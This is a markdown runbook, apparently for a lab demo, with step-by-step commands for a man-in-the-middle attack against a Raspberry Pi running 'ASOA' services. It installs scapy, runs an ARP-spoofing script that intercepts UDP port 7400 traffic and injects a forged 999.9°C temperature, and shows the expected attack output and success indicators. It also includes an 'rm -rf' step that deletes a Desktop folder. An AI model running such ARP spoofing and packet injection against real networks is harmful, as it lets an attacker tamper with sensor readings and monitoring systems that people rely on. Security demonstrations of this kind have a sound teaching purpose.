# 🎯 FINAL MITM ATTACK COMMANDS

## **Copy Files to Mac (Run on Mac Terminal):**

```bash
# 1. Remove existing folder and create fresh one
rm -rf ~/Desktop/ASOA_Projects
mkdir -p ~/Desktop/ASOA_Projects

# 2. Copy all ASOA code from Raspberry Pi
scp -r pi@192.168.1.101:/home/pi/Documents/Development/asoa_demo_my_machine_setup/ ~/Desktop/ASOA_Projects/
scp -r pi@192.168.1.101:/home/pi/Documents/Development/asoa_advanced_mitm/ ~/Desktop/ASOA_Projects/
scp -r pi@192.168.1.101:/home/pi/Documents/Development/asoa/ ~/Desktop/ASOA_Projects/
```

## **Setup MITM Attack (Run on Mac Terminal):**

```bash
# 1. Navigate to attack folder
cd ~/Desktop/ASOA_Projects/asoa_advanced_mitm

# 2. Install dependencies (one-time setup)
sudo ./setup_mac.sh

# 3. Install Python scapy (if needed)
sudo pip3 install scapy
```

## **🎯 FINAL ATTACK COMMAND:**

```bash
# Navigate to attack folder
cd ~/Desktop/ASOA_Projects/asoa_advanced_mitm

# Run the MITM attack (replace 192.168.1.101 with your Pi's IP)
sudo python3 simple_mitm_attack.py 192.168.1.101 999.9
```

## **📡 Monitor Network Traffic:**

```bash
# In a separate terminal, monitor UDP traffic
sudo tcpdump -i any -n udp port 7400
```

## **🛑 Stop Attack:**

```bash
# Press Ctrl+C in the attack terminal
```

## **📊 Expected Output:**

```
🎯 Target: 192.168.1.101
🌐 Gateway: 192.168.1.1
🌡️ Spoofed Temperature: 999.9°C
🚀 Starting ASOA MITM Attack...
🔄 Starting ARP spoofing...
📡 Starting packet sniffing on UDP port 7400...
📡 Intercepted ASOA packet #1: 192.168.1.101:12345 -> 192.168.1.101:7400
🌡️ Found temperature value: 15.3°C
🌡️ Temperature modified to 999.9°C
💉 Sent modified packet to 192.168.1.101:7400
```

## **🎉 Success Indicators:**

✅ **Attack Running**: ARP spoofing and packet sniffing active
✅ **Packets Intercepted**: UDP traffic on port 7400 captured
✅ **Temperature Modified**: Values changed from 10-30°C to 999.9°C
✅ **Dashboard Updated**: Raspberry Pi shows modified temperature

## **⚠️ Troubleshooting:**

If you get permission errors:
```bash
sudo pip3 install --user scapy
```

If you get import errors:
```bash
python3 -c "import scapy; print('Scapy works')"
```

If no packets are intercepted:
1. Check Pi IP address is correct
2. Ensure ASOA services are running on Pi
3. Verify both devices are on same network

---

**🎯 RESULT**: Temperature values in Raspberry Pi Dashboard should change from normal (10-30°C) to spoofed (999.9°C)!
